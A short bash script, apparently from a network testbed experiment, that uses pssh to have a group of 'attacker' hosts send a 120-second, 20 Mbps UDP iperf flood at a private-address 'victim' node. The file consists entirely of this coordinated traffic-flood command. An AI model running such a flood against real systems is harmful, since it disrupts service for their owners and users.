#!/usr/bin/env bash
echo "attacking victim node404"
pssh -i -h ~/.pssh_attackers2 "iperf -c 192.168.40.5 -u -b 20m -t 120 -i 1 -p 5000"